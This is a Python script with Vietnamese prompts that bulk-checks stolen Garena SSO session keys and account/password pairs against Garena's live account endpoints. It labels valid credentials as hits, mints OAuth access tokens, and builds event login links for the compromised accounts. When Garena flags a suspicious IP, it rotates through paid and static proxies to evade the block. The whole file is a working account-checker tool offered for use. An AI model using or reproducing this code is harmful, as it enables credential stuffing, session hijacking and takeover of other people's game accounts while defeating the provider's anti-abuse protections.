import requests
import sys
import os
import json
import time
import urllib3
urllib3.disable_warnings()

try:
    from check import check_login
except ImportError:
    check_login = None

# Force UTF-8 encoding on Windows to avoid console print errors
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

def load_kiot_key():
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r", encoding="utf-8-sig") as f:
            content = f.read().strip()
            if content.startswith("K") and len(content) >= 16:
                return content
    return None

def load_static_proxies():
    proxies = []
    for filename in ("proxya.txt", "proxy.txt"):
        if os.path.exists(filename):
            with open(filename, "r", encoding="utf-8-sig") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or line.startswith("K"):
                        continue
                    proxies.append(line)
    return proxies

def get_current_kiot_proxy(key):
    url = "https://api.kiotproxy.com/api/v1/proxies/current"
    try:
        r = requests.get(url, params={"key": key}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("success") and "data" in data:
                return data["data"]["http"]
    except Exception:
        pass
    return None

def get_new_kiot_proxy(key):
    url = "https://api.kiotproxy.com/api/v1/proxies/new"
    try:
        r = requests.get(url, params={"key": key, "region": "random"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("success") and "data" in data:
                return data["data"]["http"]
    except Exception:
        pass
    return None

def get_event_token(sso_key, proxy=None):
    cid = "100054"
    base = f"https://{cid}.connect.garena.com"
    
    grant_post = (
        f"client_id={cid}&response_type=token&redirect_uri=gop{cid}%3A%2F%2F"
        f"&login_scenario=normal&format=json&id={int(time.time() * 1000)}"
    )
    
    _AOV_MOBILE_UA = (
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36"
    )
    
    grant_headers = {
        "User-Agent": _AOV_MOBILE_UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
        "Origin": base,
        "Referer": f"{base}/universal/oauth?locale=vi-VN&platform=1&response_type=token"
                  f"&login_scenario=normal&client_id={cid}&redirect_uri=gop{cid}%3A%2F%2F",
        "Cookie": f"sso_key={sso_key}",
    }
    
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
    try:
        r = sess.post(
            f"{base}/oauth/token/grant",
            data=grant_post,
            headers=grant_headers,
            timeout=10,
            verify=False,
        )
        if r.status_code == 200:
            return r.json().get("access_token", "")
    except Exception:
        pass
    return ""

def check_sso_once(sso_key, proxy=None):
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    sess.cookies.set("sso_key", sso_key, domain=".garena.com")
    sess.cookies.set("sso_key", sso_key, domain="account.garena.com")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/vi",
    }
    
    # Optional: prime SSO cookies via Garena universal login
    try:
        sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": headers["User-Agent"]},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False,
            timeout=10
        )
    except Exception:
        pass
        
    try:
        r = sess.get("https://account.garena.com/api/account/init", headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if "error" in data:
                return {"status": "fail", "detail": data["error"]}
            
            ui = data.get("user_info", {})
            uid = ui.get("uid") or ui.get("user_id")
            username = ui.get("username") or ui.get("login_name")
            
            if uid or username:
                access_token = get_event_token(sso_key, proxy)
                event_link = f"https://shootingwar.lienquan.garena.vn/connect/garena/callback?access_token={access_token}" if access_token else ""
                return {
                    "status": "success",
                    "result": str(uid) if uid else "",
                    "username": str(username) if username else "",
                    "event_link": event_link
                }
            else:
                return {"status": "fail", "detail": "empty_user_info"}
        else:
            return {"status": "fail", "detail": f"http_{r.status_code}"}
    except Exception as e:
        return {"status": "fail", "detail": "connection_error"}

def check_sso_with_retry(sso_key):
    # Try direct first (no proxy)
    res = check_sso_once(sso_key)
    if res["status"] == "success" or res["detail"] == "error_session":
        return res
        
    # If blocked (suspicious_ip) or connection error, try proxies
    kiot_key = load_kiot_key()
    static_proxies = load_static_proxies()
    
    if kiot_key:
        # Try current KiotProxy
        proxy = get_current_kiot_proxy(kiot_key)
        if proxy:
            res = check_sso_once(sso_key, proxy)
            if res["status"] == "success" or res["detail"] == "error_session":
                return res
        
        # Try getting new KiotProxy
        proxy = get_new_kiot_proxy(kiot_key)
        if proxy:
            res = check_sso_once(sso_key, proxy)
            if res["status"] == "success" or res["detail"] == "error_session":
                return res
                
    if static_proxies:
        for proxy in static_proxies[:5]: # Try up to 5 static proxies
            res = check_sso_once(sso_key, proxy)
            if res["status"] == "success" or res["detail"] == "error_session":
                return res
                
    return res

def check_account_once(account, password, proxy=None):
    if not check_login:
        return {"status": "fail", "detail": "missing_check_module"}
    try:
        r = check_login(account, password, fetch_info=True, proxy=proxy)
        status = r.get("status")
        if status == "HIT":
            sso_key = r.get("sso_key")
            uid = r.get("uid")
            username = r.get("username") or account
            if sso_key:
                access_token = get_event_token(sso_key, proxy)
                event_link = f"https://shootingwar.lienquan.garena.vn/connect/garena/callback?access_token={access_token}" if access_token else ""
                return {
                    "status": "success",
                    "result": str(uid) if uid else "",
                    "username": str(username) if username else "",
                    "event_link": event_link
                }
            else:
                return {"status": "fail", "detail": "missing_sso_key"}
        else:
            return {"status": "fail", "detail": r.get("detail") or status or "login_failed"}
    except Exception as e:
        return {"status": "fail", "detail": "connection_error"}

def check_account_with_retry(account, password):
    # Try direct first (no proxy)
    res = check_account_once(account, password)
    if res["status"] == "success" or res["detail"] in ("INVALID", "result=3", "result=101", "result=367"):
        return res
        
    # If blocked (suspicious_ip / proxy block) or connection error, try proxies
    kiot_key = load_kiot_key()
    static_proxies = load_static_proxies()
    
    if kiot_key:
        # Try current KiotProxy
        proxy = get_current_kiot_proxy(kiot_key)
        if proxy:
            res = check_account_once(account, password, proxy)
            if res["status"] == "success" or res["detail"] in ("INVALID", "result=3", "result=101", "result=367"):
                return res
        
        # Try getting new KiotProxy
        proxy = get_new_kiot_proxy(kiot_key)
        if proxy:
            res = check_account_once(account, password, proxy)
            if res["status"] == "success" or res["detail"] in ("INVALID", "result=3", "result=101", "result=367"):
                return res
                
    if static_proxies:
        for proxy in static_proxies[:5]:
            res = check_account_once(account, password, proxy)
            if res["status"] == "success" or res["detail"] in ("INVALID", "result=3", "result=101", "result=367"):
                return res
                
    return res

def main():
    if len(sys.argv) >= 2:
        arg1 = sys.argv[1]
        
        if arg1 == "--file" and len(sys.argv) >= 3:
            filepath = sys.argv[2]
            if not os.path.exists(filepath):
                print(f"Lỗi: Không tìm thấy file {filepath}")
                sys.exit(1)
                
            print(f"Đang đọc SSO keys từ {filepath}...")
            with open(filepath, "r", encoding="utf-8-sig") as f:
                keys = [line.strip() for line in f if line.strip()]
                
            print(f"Tìm thấy {len(keys)} SSO keys. Bắt đầu check...\n")
            
            for idx, key in enumerate(keys, 1):
                print(f"[{idx}/{len(keys)}] Key: {key[:10]}...{key[-10:] if len(key) > 20 else ''}")
                res = check_sso_with_retry(key)
                print(json.dumps(res, indent=2, ensure_ascii=False))
                print("-" * 40)
        else:
            # Check single key
            key = arg1
            res = check_sso_with_retry(key)
            print(json.dumps(res, indent=2, ensure_ascii=False))
    else:
        print("=== TRÌNH CHECK GARENA SSO KEY ===")
        while True:
            try:
                user_input = input("\nNhập SSO Key hoặc đường dẫn file .txt (gõ 'q' để thoát): ").strip().strip('"\'')
                if not user_input:
                    continue
                if user_input.lower() in ("q", "exit", "quit"):
                    break
                
                # Check if it is a file
                if os.path.isfile(user_input):
                    print(f"Đang đọc SSO keys từ {user_input}...")
                    with open(user_input, "r", encoding="utf-8-sig") as f:
                        keys = [line.strip() for line in f if line.strip()]
                    print(f"Tìm thấy {len(keys)} SSO keys. Bắt đầu check...\n")
                    for idx, key in enumerate(keys, 1):
                        print(f"[{idx}/{len(keys)}] Key: {key[:10]}...{key[-10:] if len(key) > 20 else ''}")
                        res = check_sso_with_retry(key)
                        print(json.dumps(res, indent=2, ensure_ascii=False))
                        print("-" * 40)
                else:
                    # Check single key
                    print("Đang check SSO Key...")
                    res = check_sso_with_retry(user_input)
                    print(json.dumps(res, indent=2, ensure_ascii=False))
            except (KeyboardInterrupt, EOFError):
                break
        print("\nTạm biệt!")

if __name__ == "__main__":
    main()
